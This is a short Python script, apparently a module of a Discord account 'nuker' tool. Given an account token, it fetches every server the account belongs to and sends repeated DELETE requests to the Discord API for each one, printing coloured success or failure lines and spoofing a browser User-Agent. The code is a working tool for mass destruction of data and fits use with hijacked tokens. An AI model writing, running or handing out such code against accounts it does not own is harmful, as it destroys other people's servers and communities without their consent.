
import requests
import time
from colorama import Fore, Style

def getheaders(token):
    return {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

def new_title(title):
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"{Fore.YELLOW}{title.center(50)}")
    print(f"{Fore.CYAN}{'='*50}{Fore.RESET}\n")

def deleteServers(token):
    """Delete all owned Discord servers"""
    new_title('Server Deleter')
    print(f"{Fore.YELLOW}[!] Deleting owned servers...{Fore.RESET}")
    
    try:
        headers = {'Authorization': token}
        guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
        for guild in guildsIds:
            try:
                for i in range(2):
                    response = requests.delete(
                        f'https://discord.com/api/v9/guilds/{guild["id"]}', 
                        headers={'Authorization': token}
                    )
                    
                    if response.status_code in (204, 200):
                        print(f"{Fore.GREEN}[+] {Fore.LIGHTCYAN_EX}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.GREEN}DELETED{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                    else:
                        print(f"{Fore.RED}[-] {Fore.LIGHTCYAN_EX}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.LIGHTBLACK_EX}[{Fore.RED}FAILED TO DELETE{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
                        print(f"    Status: {response.status_code}")
                    time.sleep(0.5)
                
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error deleting server {guild.get('name', 'unknown')}: {e}{Fore.RESET}")
                
    except Exception as e:
        print(f"{Fore.RED}[-] Delete servers failed: {e}{Fore.RESET}")
    
